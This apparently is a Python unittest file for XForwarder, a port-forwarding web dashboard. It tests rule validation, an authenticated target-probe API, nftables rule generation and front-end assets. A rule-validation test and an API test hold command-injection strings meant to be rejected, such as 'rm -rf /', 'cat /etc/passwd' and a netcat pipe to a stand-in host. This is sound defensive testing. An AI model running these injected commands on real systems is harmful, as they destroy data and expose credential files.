#!/usr/bin/env python3
"""
Unit tests for XForwarder UI, API Edge Cases, and Multi-Priority Validation.
Covers rule destination cascades, SSL fallback, boundary sanitization, and static asset integrity.
Standard Library unittest only.
"""

import os
import sys
import unittest
import tempfile
import json
import re
import time
import threading
import urllib.request
import urllib.error
from http.server import HTTPServer
from unittest.mock import patch, MagicMock

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from core.web_server import (
    validate_rule,
    is_valid_target,
    XForwarderWebServer,
    load_config,
    get_services_status,
    XForwarderWebHandler,
    ACTIVE_SESSIONS,
    SESSION_LOCK
)
from core.engine import XForwarderEngine


class TestUIAndAPIEdgeCases(unittest.TestCase):

    def test_validate_rule_arbitrary_priorities(self):
        """Verifies that validate_rule accepts arbitrary cascading priorities (P1..PN)."""
        rule = {
            "port": 9000,
            "protocol": "both",
            "destinations": [
                {"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 9000},
                {"priority": 2, "type": "nftables", "target": "10.0.0.2", "port": 9000},
                {"priority": 3, "type": "nginx", "target": "10.0.0.3", "port": 9000},
                {"priority": 4, "type": "haproxy", "target": "2001:db8::4", "port": 9000}
            ]
        }
        valid, msg = validate_rule(rule)
        self.assertTrue(valid, f"Expected valid rule, got: {msg}")
        self.assertEqual(len(rule["destinations"]), 4)

    def test_validate_rule_empty_destinations_rejected(self):
        """Verifies that a rule without destinations is rejected."""
        rule = {"port": 8080, "protocol": "tcp", "destinations": []}
        valid, msg = validate_rule(rule)
        self.assertFalse(valid)
        self.assertIn("destination", msg.lower())

    def test_validate_rule_port_boundary_conditions(self):
        """Tests port bounds (1 to 65535)."""
        # Port 0
        valid, _ = validate_rule({"port": 0, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Port 65536
        valid, _ = validate_rule({"port": 65536, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Negative port
        valid, _ = validate_rule({"port": -1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertFalse(valid)

        # Valid boundary min
        valid, _ = validate_rule({"port": 1, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

        # Valid boundary max
        valid, _ = validate_rule({"port": 65535, "protocol": "tcp", "destinations": [{"target": "1.1.1.1"}]})
        self.assertTrue(valid)

    def test_validate_rule_destination_defaults_port_if_missing(self):
        """Verifies destination inherits rule listening port when omitted."""
        rule = {
            "port": 4444,
            "protocol": "udp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::50"}]
        }
        valid, _ = validate_rule(rule)
        self.assertTrue(valid)
        self.assertEqual(rule["destinations"][0]["port"], 4444)

    def test_validate_rule_invalid_characters_rejected(self):
        """Prevents shell command injection characters in destination target."""
        hazards = [
            "1.2.3.4; rm -rf /",
            "1.2.3.4 && cat /etc/passwd",
            "1.2.3.4 | nc evil 1337",
            "1.2.3.4`reboot`",
            "1.2.3.4$(whoami)"
        ]
        for hazard in hazards:
            rule = {"port": 1234, "protocol": "tcp", "destinations": [{"target": hazard}]}
            valid, msg = validate_rule(rule)
            self.assertFalse(valid, f"Should reject hazard: {hazard}")

    def test_ssl_web_server_graceful_fallback(self):
        """Verifies that XForwarderWebServer handles missing SSL certs without crashing."""
        server = XForwarderWebServer(port=18090, bind_host="127.0.0.1")
        # Explicitly set invalid certificate path
        server.ssl_cert = "/tmp/nonexistent_cert_123.crt"
        server.ssl_key = "/tmp/nonexistent_key_123.key"

        # Web server start logic should catch the FileNotFoundError and stay running as HTTP
        self.assertFalse(server.is_ssl)

    def test_static_assets_integrity(self):
        """Verifies that index.html, style.css, and app.js exist and meet architectural standards."""
        web_dir = os.path.join(REPO_ROOT, "web")
        index_path = os.path.join(web_dir, "index.html")
        style_path = os.path.join(web_dir, "style.css")
        app_path = os.path.join(web_dir, "app.js")

        self.assertTrue(os.path.exists(index_path), "index.html must exist")
        self.assertTrue(os.path.exists(style_path), "style.css must exist")
        self.assertTrue(os.path.exists(app_path), "app.js must exist")

        with open(index_path, "r", encoding="utf-8") as f:
            index_content = f.read()

        with open(style_path, "r", encoding="utf-8") as f:
            style_content = f.read()

        with open(app_path, "r", encoding="utf-8") as f:
            app_content = f.read()

        # 1. Check data-theme pre-hydration script in <head>
        self.assertIn('localStorage.getItem("xfwd_theme")', index_content)
        self.assertIn('data-theme', index_content)

        # 2. Check Light & Dark theme definitions in style.css
        self.assertIn('[data-theme="light"]', style_content)
        self.assertIn('[data-theme="dark"]', style_content)

        # 3. Check hidden scrollbar on modal card
        self.assertIn('scrollbar-width: none', style_content)
        self.assertIn('.modal-card::-webkit-scrollbar', style_content)

        # 4. Check select arrow spacing styling
        self.assertIn('select.form-control', style_content)
        self.assertIn('padding-right: 40px', style_content)

        # 5. Verify quick presets was removed from index.html
        self.assertNotIn('presetHaproxyGre', index_content)
        self.assertNotIn('presetNginxTunnel', index_content)

        # 6. Verify critical DOM element IDs exist in index.html
        critical_ids = [
            "rulesContainer",
            "ruleModal",
            "securityModal",
            "confirmModal",
            "statTotalRules",
            "statActiveHaproxy",
            "statActiveNftables",
            "engineStatusBadge",
            "btnOpenAddModal",
            "searchInput",
            "batchOverrideSelect",
            "btnThemeToggle",
            "btnLoginThemeToggle",
            "loginThemeName",
            "loginScreen",
            "logConsole"
        ]
        for cid in critical_ids:
            self.assertIn(f'id="{cid}"', index_content, f"Missing critical DOM ID: {cid}")

        # 7. Verify unified login screen styling and light theme card shadow in style.css
        self.assertIn('.login-top-bar', style_content)
        self.assertIn('.login-logo', style_content)
        self.assertIn('[data-theme="light"] .login-card', style_content)

        # 8. Verify 2-column rules layout and vertical paths stacking
        self.assertIn('grid-template-columns: repeat(2', style_content)
        self.assertIn('.paths-grid', style_content)
        self.assertIn('flex-direction: column', style_content)
        self.assertIn('.rule-test-bar', style_content)
        self.assertIn('.btn-mode-pill', style_content)
        self.assertIn('.btn-path-test', style_content)

        # 9. Verify testing controls and mode switcher in app.js
        with open(os.path.join(REPO_ROOT, "web", "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        self.assertIn('Auto Failover', app_content)
        self.assertIn('Force P', app_content)
        self.assertIn('btn-mode-pill', app_content)
        self.assertIn('btn-path-test', app_content)

        # 10. Verify faded/dimmed styling for down priority paths
        self.assertIn('.path-box.is-down', style_content)
        self.assertIn("'is-down'", app_content)

    def test_services_status_api_and_dom(self):
        """Verifies get_services_status API structure and DOM presence for NFTables, HAProxy, and Nginx."""
        services = get_services_status()
        self.assertIsInstance(services, dict)
        for svc in ("nftables", "haproxy", "nginx"):
            self.assertIn(svc, services)
            item = services[svc]
            self.assertIn("installed", item)
            self.assertIn("active", item)
            self.assertIn("version", item)
            self.assertIn("details", item)
            self.assertIsInstance(item["installed"], bool)
            self.assertIsInstance(item["active"], bool)

        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "index.html"), "r", encoding="utf-8") as f:
            index_content = f.read()
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            style_content = f.read()

        # Check DOM element IDs
        for expected_id in (
            "servicesStatusBar",
            "svcPillNft", "svcValNft", "svcDotNft",
            "svcPillHaproxy", "svcValHaproxy", "svcDotHaproxy",
            "svcPillNginx", "svcValNginx", "svcDotNginx",
            "servicesWarningBanner",
            "badgeHaproxyStatus", "badgeNftablesStatus", "badgeNginxStatus"
        ):
            self.assertIn(f'id="{expected_id}"', index_content, f"Missing services DOM ID: {expected_id}")

        # Check app.js function and services rendering
        self.assertIn("renderServicesStatus", app_content)
        self.assertIn("svcDotNft", app_content)
        self.assertIn("svcDotHaproxy", app_content)
        self.assertIn("svcDotNginx", app_content)

        # Check style.css classes
        self.assertIn(".services-status-bar", style_content)
        self.assertIn(".services-warning-banner", style_content)
        self.assertIn(".svc-pill-dot", style_content)

    def test_ui_proxy_protocol_and_test_target_dom(self):
        """Verifies UI elements for PROXY Protocol toggle and Test Target button exist."""
        web_dir = os.path.join(REPO_ROOT, "web")
        with open(os.path.join(web_dir, "app.js"), "r", encoding="utf-8") as f:
            app_content = f.read()
        with open(os.path.join(web_dir, "style.css"), "r", encoding="utf-8") as f:
            style_content = f.read()

        self.assertIn("dest-proxy-proto", app_content)
        self.assertIn("proxy_protocol", app_content)
        self.assertIn("testModalDestination", app_content)
        self.assertIn("/test-target", app_content)
        self.assertIn("function addLogEntry", app_content)
        self.assertIn("function appendLogEntry", app_content)
        self.assertIn("runLivePacketLossTest", app_content)
        self.assertIn("pendingOverrides", app_content)
        self.assertIn("<span>Forced</span>", app_content)
        self.assertNotIn("<span>Forced (Reset)</span>", app_content)

        self.assertIn(".dest-proxy-proto", style_content)
        self.assertIn(".btn-test-dest", style_content)
        self.assertIn(".test-dest-result", style_content)

    def test_api_test_target_http_endpoint(self):
        """Tests POST /api/test-target endpoint auth, input validation, and successful probing."""
        cfg = load_config()
        secret = str(cfg.get("web", {}).get("secret_path", "")).strip().strip("/")
        secret_prefix = f"/{secret}" if secret else ""

        server = HTTPServer(("127.0.0.1", 0), XForwarderWebHandler)
        port = server.server_port
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()

        token = "test_target_session_token"
        with SESSION_LOCK:
            ACTIVE_SESSIONS[token] = {
                "username": "admin",
                "created_at": time.time(),
                "last_active": time.time(),
                "expires_at": time.time() + 3600
            }

        try:
            # 1. Unauthenticated request under secret prefix must return 401
            req_unauth = urllib.request.Request(
                f"http://127.0.0.1:{port}{secret_prefix}/api/test-target",
                data=json.dumps({"target": "127.0.0.1", "port": 80}).encode("utf-8"),
                headers={"Content-Type": "application/json"}
            )
            try:
                urllib.request.urlopen(req_unauth, timeout=3.0)
                self.fail("Expected 401 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 401)

            # 2. Authenticated request with invalid target syntax must return 400
            req_bad = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/test-target",
                data=json.dumps({"target": "127.0.0.1; rm -rf /", "port": 80}).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            try:
                urllib.request.urlopen(req_bad, timeout=3.0)
                self.fail("Expected 400 HTTPError")
            except urllib.error.HTTPError as err:
                self.assertEqual(err.code, 400)

            # 3. Authenticated valid request returns JSON with ok: true
            req_valid = urllib.request.Request(
                f"http://127.0.0.1:{port}/api/test-target",
                data=json.dumps({"target": "127.0.0.1", "port": port}).encode("utf-8"),
                headers={
                    "Content-Type": "application/json",
                    "Cookie": f"xfwd_session={token}",
                    "Origin": f"http://127.0.0.1:{port}"
                }
            )
            with urllib.request.urlopen(req_valid, timeout=3.0) as resp:
                self.assertEqual(resp.status, 200)
                body = json.loads(resp.read().decode("utf-8"))
                self.assertTrue(body.get("ok"))
                self.assertTrue(body.get("healthy"))
                self.assertIsNotNone(body.get("latency_ms"))
        finally:
            server.shutdown()
            server.server_close()

    def test_frontend_css_no_hover_motion_transforms(self):
        """Verifies that style.css contains zero hover transform animations (pure subtle color transitions)."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        hover_blocks = re.findall(r'([^{}]*?:hover[^{}]*?\{[^}]*?\})', css, re.DOTALL)
        for block in hover_blocks:
            clean_block = " ".join(block.split())
            self.assertNotIn("transform", clean_block, f"Hover block must not contain transform motion: {clean_block}")
            self.assertNotIn("translateY", clean_block, f"Hover block must not jump vertically: {clean_block}")
            self.assertNotIn("scale", clean_block, f"Hover block must not scale: {clean_block}")

    def test_frontend_js_latency_and_priority_shortening(self):
        """Verifies that app.js suppresses 0ms latency and formats concise reasons and #num priorities."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # formatLatencyBadge must strictly check for <= 0
        self.assertIn("formatLatencyBadge", js)
        self.assertIn("formatConciseReason", js)
        self.assertIn("ms <= 0", js)
        self.assertIn("#${prio}", js)
        self.assertNotIn("PRIMARY ACTIVE · P1", js)

    def test_drag_and_drop_priority_reordering_integrity(self):
        """Verifies that both rules list and modal support priority drag-and-drop reordering with valid handles."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. Rules list drag-and-drop handlers
        self.assertIn("handlePathDragStart", js)
        self.assertIn("handlePathDragOver", js)
        self.assertIn("handlePathDragLeave", js)
        self.assertIn("handlePathDrop", js)
        self.assertIn("handlePathDragEnd", js)

        # 2. Modal drag-and-drop handlers
        self.assertIn("handleModalPrioDragStart", js)
        self.assertIn("handleModalPrioDragOver", js)
        self.assertIn("handleModalPrioDragLeave", js)
        self.assertIn("handleModalPrioDrop", js)
        self.assertIn("handleModalPrioDragEnd", js)

        # 3. Handle must not be marked draggable="false"
        self.assertNotIn('class="drag-handle" title="Drag to reorder priority" draggable="false"', js)
        self.assertIn('class="drag-handle" title="Drag to reorder priority"', js)

        # 4. Drag-handle SVG pointer events none to ensure grab event propagation
        self.assertIn(".drag-handle svg", css)
        self.assertIn("pointer-events: none", css)

        # 5. CSS classes for drag state
        self.assertIn(".path-box.is-dragging", css)
        self.assertIn(".path-box.drag-over", css)
        self.assertIn(".priority-box.is-dragging", css)
        self.assertIn(".priority-box.drag-over", css)

    def test_drag_and_drop_edge_cases_and_reorder_logic(self):
        """Verifies edge case handling for priority reordering: click isolation, rule scoping, and index bounds."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. Verify click-target isolation: prevents drag start on interactive controls (buttons, copy icon, inputs)
        self.assertIn('e.target.closest("button, .btn-copy, .btn-path-test, input, select, a")', js)

        # 2. Verify within-rule drag scoping: drop target highlight only allowed within the same rule
        self.assertIn("draggedPathInfo.ruleId === ruleId && draggedPathInfo.index !== index", js)

        # 3. Verify lower & upper bounds check before array mutation in both list and modal
        self.assertIn("fromIndex < 0 || toIndex < 0 || fromIndex >= dests.length || toIndex >= dests.length", js)
        self.assertIn("fromIndex < 0 || fromIndex >= currentModalDestinations.length || toIndex < 0 || toIndex >= currentModalDestinations.length", js)

        # 4. Verify fallback rule ID resolution for legacy rules lacking explicit 'id'
        self.assertIn("String(r.id || `rule-${r.port}`) === ruleId", js)

        # 5. Verify backend validate_rule accepts reordered destinations with contiguous priorities
        reordered_rule = {
            "id": "rule-4433",
            "port": 4433,
            "protocol": "both",
            "active_priority": 1,
            "force_override": 0,
            "destinations": [
                {"priority": 1, "type": "nftables", "target": "10.88.2.2", "port": 4433, "comment": "Now Primary"},
                {"priority": 2, "type": "haproxy", "target": "2001:cafe::1", "port": 4433, "comment": "Now Backup"}
            ]
        }
        valid, err = validate_rule(reordered_rule)
        self.assertTrue(valid, f"Reordered destination chain should pass validation: {err}")
        self.assertEqual(reordered_rule["destinations"][0]["priority"], 1)
        self.assertEqual(reordered_rule["destinations"][1]["priority"], 2)

    def test_overview_relay_engines_alignment_and_responsive(self):
        """Verifies that formatEngineVersion truncates long distro strings and CSS enforces aligned, responsive info items."""
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. formatEngineVersion presence
        self.assertIn("function formatEngineVersion", js)

        # 2. info-value right alignment and wrap protection
        self.assertIn(".info-value", css)
        self.assertIn("text-align: right", css)

        # 3. info-item flex gap spacing
        self.assertIn("gap: 12px", css)

        # 4. Mobile responsive layout
        self.assertIn("@media (max-width: 480px)", css)

    def test_full_responsive_system_integrity(self):
        """Verifies multi-tier responsive system: topbar condensation, drawer breakpoint, and balanced grids."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. HTML responsive classes
        self.assertIn('class="ram-full"', html)
        self.assertIn('class="ram-short"', html)
        self.assertIn('class="btn-text">Security<', html)
        self.assertIn('class="btn-text">Logout<', html)

        # 2. JS responsive metric injection & drawer auto-close
        self.assertIn('<span class="ram-full">', js)
        self.assertIn('<span class="ram-short">', js)
        self.assertIn("closeMobileSidebar();", js)

        # 3. CSS breakpoints & flex constraints
        self.assertIn("@media (min-width: 1560px)", css)
        self.assertIn("@media (max-width: 1350px)", css)
        self.assertIn("@media (max-width: 1280px)", css)
        self.assertIn("@media (max-width: 1024px)", css)
        self.assertIn("@media (max-width: 768px)", css)
        self.assertIn("@media (max-width: 580px)", css)
        self.assertIn("@media (max-width: 480px)", css)
        self.assertIn(".sys-pill", css)
        self.assertIn("white-space: nowrap", css)
        self.assertIn(".ram-full", css)
        self.assertIn(".ram-short", css)
        self.assertIn("grid-template-columns: repeat(4, 1fr)", css)
        self.assertIn("grid-template-columns: repeat(2, 1fr)", css)

        # 4. Metric sanitization edge case protection
        self.assertIn("Number(sys.ram_used_mb)", js)
        self.assertIn("Number(sys.ram_total_mb)", js)
        self.assertIn("Number(sys.ram_percent)", js)
        self.assertIn("Number(sys.cpu_percent)", js)

    def test_packet_loss_calculation_and_probes(self):
        """Verifies that engine.check_destination calculates packet_loss metrics properly."""
        engine = XForwarderEngine()

        # Invalid target must return 100% loss
        res_invalid = engine.check_destination({"target": "", "port": 0})
        self.assertFalse(res_invalid["healthy"])
        self.assertEqual(res_invalid["packet_loss"], 100)

        from unittest.mock import patch, MagicMock
        # Mock unreachable socket and ping
        with patch("socket.socket") as mock_sock, patch("subprocess.call", return_value=1), patch("subprocess.run") as mock_run:
            mock_s = MagicMock()
            mock_s.connect_ex.return_value = 111
            mock_sock.return_value.__enter__.return_value = mock_s
            mock_proc = MagicMock()
            mock_proc.returncode = 1
            mock_proc.stdout = "100% packet loss"
            mock_run.return_value = mock_proc

            # Single probe failure returns 100% loss and healthy=False
            res_single = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp")
            self.assertIn("packet_loss", res_single)
            self.assertEqual(res_single["packet_loss"], 100)
            self.assertFalse(res_single["healthy"])

            # Multi-probe test (count=3) returns sent and received metrics
            res_multi = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp", count=3)
            self.assertIn("packet_loss", res_multi)
            self.assertEqual(res_multi["packets_sent"], 3)
            self.assertEqual(res_multi["packets_received"], 0)
            self.assertEqual(res_multi["packet_loss"], 100)

        # Mock reachable socket
        with patch("socket.socket") as mock_sock:
            mock_s = MagicMock()
            mock_s.connect_ex.return_value = 0
            mock_sock.return_value.__enter__.return_value = mock_s

            res_healthy = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp")
            self.assertTrue(res_healthy["healthy"])
            self.assertEqual(res_healthy["packet_loss"], 0)

            res_healthy_multi = engine.check_destination({"target": "192.0.2.1", "port": 443, "type": "haproxy"}, protocol="tcp", count=4)
            self.assertTrue(res_healthy_multi["healthy"])
            self.assertEqual(res_healthy_multi["packet_loss"], 0)
            self.assertEqual(res_healthy_multi["packets_received"], 4)

    def test_static_asset_cache_control_and_versioning(self):
        """Verifies that static assets have cache-busting headers and query parameters."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        web_server_path = os.path.join(REPO_ROOT, "core", "web_server.py")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(web_server_path, "r", encoding="utf-8") as f:
            web_code = f.read()

        # HTML has query versioning
        self.assertIn("style.css?v=", html)
        self.assertIn("app.js?v=", html)

        # web_server sends Cache-Control: no-cache, no-store
        self.assertIn('self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")', web_code)
        self.assertIn('self.send_header("Pragma", "no-cache")', web_code)

    def test_tcp_udp_protocol_formatting_and_no_both(self):
        """Verifies that BOTH is replaced by TCP + UDP across the frontend."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # HTML select option
        self.assertIn('value="both">TCP + UDP (Recommended)', html)

        # JS formatProtoBadge returns TCP + UDP
        self.assertIn('return "TCP + UDP"', js)

    def test_packet_loss_diagnostic_tool_elements(self):
        """Verifies that packet loss UI tool and functions exist in frontend."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # HTML diagnostic elements
        self.assertIn('id="diagTargetInput"', html)
        self.assertIn('id="btnRunDiagTest"', html)
        self.assertIn('id="diagResultContainer"', html)

        # JS diagnostic handlers
        self.assertIn("runLivePacketLossTest", js)
        self.assertIn("initDiagPacketLossTool", js)
        self.assertIn("btn-path-test", js)

    def test_topology_and_engines_grid_layout(self):
        """Verifies that Server Network & Tunnel Topology and Relay Engines are structured in a 2-column balanced grid."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # HTML has 2-column container
        self.assertIn('class="topology-engines-grid"', html)
        self.assertIn('class="network-card" id="networkCard"', html)
        self.assertIn('class="engines-card" id="servicesStatusBar"', html)
        self.assertIn('class="engine-item" id="svcPillNft"', html)
        self.assertIn('class="engine-item" id="svcPillHaproxy"', html)
        self.assertIn('class="engine-item" id="svcPillNginx"', html)

        # CSS has grid and responsive collapse
        self.assertIn(".topology-engines-grid", css)
        self.assertIn("grid-template-columns: minmax(0, 1.25fr) minmax(0, 0.75fr)", css)
        self.assertIn(".engine-item", css)

    def test_validate_rule_haproxy_requires_ipv6(self):
        """Verifies that validate_rule strictly enforces that HAProxy destinations must be IPv6."""
        # IPv4 targets must be rejected for HAProxy
        ipv4_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "1.2.3.4", "port": 8080}]
        }
        ok_v4, err_v4 = validate_rule(ipv4_rule)
        self.assertFalse(ok_v4)
        self.assertIn("must be a valid IPv6 address", err_v4)

        # Hostnames must be rejected for HAProxy
        host_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "exit.node.com", "port": 8080}]
        }
        ok_host, err_host = validate_rule(host_rule)
        self.assertFalse(ok_host)
        self.assertIn("must be a valid IPv6 address", err_host)

        # Valid IPv6 without brackets
        v6_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "2001:db8::1", "port": 8080}]
        }
        ok_v6, err_v6 = validate_rule(v6_rule)
        self.assertTrue(ok_v6, f"Expected valid IPv6 to pass, got: {err_v6}")

        # Valid IPv6 with brackets
        v6_bracket_rule = {
            "port": 8080,
            "protocol": "tcp",
            "destinations": [{"priority": 1, "type": "haproxy", "target": "[2001:db8::1]", "port": 8080}]
        }
        ok_b, err_b = validate_rule(v6_bracket_rule)
        self.assertTrue(ok_b, f"Expected bracketed IPv6 to pass, got: {err_b}")

    def test_nftables_dual_stack_rules_generation(self):
        """Verifies that _apply_nftables generates isolated table ip and table ip6 for dual-stack forwarding."""
        from core.engine import XForwarderEngine
        engine = XForwarderEngine()

        dnat_rules = [
            '        iifname "eth0" tcp dport 8443 dnat to 10.88.1.2:8443',
            '        iifname "eth0" udp dport 8443 dnat to 10.88.1.2:8443',
            '        iifname "eth0" tcp dport 9443 dnat to [2001:db8::2]:9443',
            '        iifname "eth0" udp dport 9443 dnat to [2001:db8::2]:9443'
        ]

        with patch("shutil.which", return_value="nft"), \
             patch("subprocess.run") as mock_run, \
             patch("subprocess.Popen") as mock_popen, \
             patch.object(engine, "_is_ipv6_supported", return_value=True):
            mock_proc = MagicMock()
            mock_proc.communicate.return_value = ("", "")
            mock_proc.returncode = 0
            mock_popen.return_value = mock_proc

            ok, err = engine._apply_nftables(dnat_rules)
            self.assertTrue(ok)
            self.assertIsNone(err)

            sent_input = mock_proc.communicate.call_args_list[0][1]["input"]
            # Verify IPv4 table exists and contains IPv4 rules
            self.assertIn("table ip xfwd_orchestrator", sent_input)
            self.assertIn('dnat to 10.88.1.2:8443', sent_input)

            # Verify IPv6 table exists and contains IPv6 rules
            self.assertIn("table ip6 xfwd_orchestrator", sent_input)
            self.assertIn('dnat to [2001:db8::2]:9443', sent_input)

            # Verify masquerade on tunnel interfaces exists in both
            self.assertIn('oifname "gre*" masquerade', sent_input)
            self.assertIn('oifname "wg*" masquerade', sent_input)
            self.assertIn('oifname "tun*" masquerade', sent_input)

    def test_dark_theme_tokens_and_restrained_highlights(self):
        """Verifies that dark theme uses obsidian palette and restrains highlights strictly to important states."""
        css_path = os.path.join(REPO_ROOT, "web", "style.css")
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        js_path = os.path.join(REPO_ROOT, "web", "app.js")

        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()
        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(js_path, "r", encoding="utf-8") as f:
            js = f.read()

        # 1. Dark theme tokens in :root, [data-theme="dark"] (Nova Admin Theme)
        self.assertIn("--bg-base: #0B0E14;", css)
        self.assertIn("--bg-surface: #12151f;", css)
        self.assertIn("--accent-rose: #FB7185;", css)

        # 2. Stats numbers in index.html should not have hardcoded glare classes
        self.assertNotIn('id="statActiveHaproxy" class="stat-number text-emerald"', html)
        self.assertNotIn('class="stat-number text-emerald" id="statActiveHaproxy"', html)
        self.assertNotIn('id="statActiveNftables" class="stat-number text-amber"', html)
        self.assertNotIn('class="stat-number text-amber" id="statActiveNftables"', html)

        # 3. Path box active indicator uses left accent border, not neon blur halo
        self.assertIn("border-left: 3px solid var(--accent-emerald);", css)
        self.assertNotIn("box-shadow: 0 0 16px -4px rgba(16, 185, 129, 0.25);", css)

        # 4. Latency threshold in app.js reserves amber warning for > 150ms or loss > 0%
        self.assertIn("ms > 150", js)
        self.assertIn("ms > 250", js)
        self.assertNotIn("ms > 70", js)

    def test_latency_badge_classification_edge_cases(self):
        """Tests that latency classification thresholds categorize clean pings and failure conditions correctly."""
        def classify(status, loss, ms):
            is_healthy = (status == "healthy")
            is_degraded = (status == "degraded")
            is_failed = (status in ("failed", "down"))
            if is_failed or (not is_healthy and not is_degraded):
                return "latency-bad"
            if ms is None or ms <= 0:
                return "latency-good"
            if is_degraded or loss > 25 or ms > 250:
                return "latency-bad"
            if loss > 0 or ms > 150:
                return "latency-medium"
            return "latency-good"

        # Healthy international ping (78ms, 0% loss) -> must be good, NOT warning amber
        self.assertEqual(classify("healthy", 0, 78.2), "latency-good")
        self.assertEqual(classify("healthy", 0, 149.0), "latency-good")

        # Elevated latency (>150ms, 0% loss) -> warning amber
        self.assertEqual(classify("healthy", 0, 151.0), "latency-medium")

        # High latency (>250ms) -> bad rose
        self.assertEqual(classify("healthy", 0, 260.0), "latency-bad")

        # Minor packet loss (>0% and <=25%) -> warning amber
        self.assertEqual(classify("healthy", 5, 50.0), "latency-medium")

        # Severe packet loss (>25%) -> bad rose
        self.assertEqual(classify("healthy", 30, 50.0), "latency-bad")

        # Explicit down / failed status -> bad rose
        self.assertEqual(classify("failed", 100, 0), "latency-bad")
        self.assertEqual(classify("down", 100, 0), "latency-bad")

        # Degraded status -> bad rose
        self.assertEqual(classify("degraded", 10, 40.0), "latency-bad")

    def test_nova_admin_design_system_and_login_cleanup(self):
        """Verifies Nova Admin Template v3 design tokens, Aurora lighting layer, and clean login card."""
        html_path = os.path.join(REPO_ROOT, "web", "index.html")
        css_path = os.path.join(REPO_ROOT, "web", "style.css")

        with open(html_path, "r", encoding="utf-8") as f:
            html = f.read()
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # 1. Typography & Google Fonts (Space Grotesk display font)
        self.assertIn("family=Space+Grotesk", html, "index.html must load Space Grotesk font")
        self.assertIn("--font-display: 'Space Grotesk'", css, "CSS must define Space Grotesk as display font")
        self.assertIn("font-family: var(--font-display);", css, "Headings & stats must bind to font-display")

        # 2. Floating Aurora Ambient Lighting Layer
        self.assertIn('class="aurora"', html, "index.html must have .aurora background container")
        self.assertIn(".aurora {", css, "style.css must style .aurora")
        self.assertIn("pointer-events: none;", css, "Aurora must never intercept pointer events")
        self.assertIn("@keyframes float1", css, "Aurora must define float1 keyframe animation")
        self.assertIn("@media (prefers-reduced-motion: reduce)", css, "Must honor prefers-reduced-motion")

        # 3. Nova Signature Color Tokens (Dark & Light)
        # Dark Theme
        self.assertIn("--bg-base: #0B0E14;", css)
        self.assertIn("--bg-surface: #12151f;", css)
        self.assertIn("--mint: #6EE7B7;", css)
        self.assertIn("--violet: #A78BFA;", css)
        self.assertIn("--amber: #FBBF6B;", css)
        self.assertIn("--red: #FB7185;", css)
        self.assertIn("--blob-1: #22315c;", css)

        # Light Theme
        self.assertIn("--bg-base: #EEF1F7;", css)
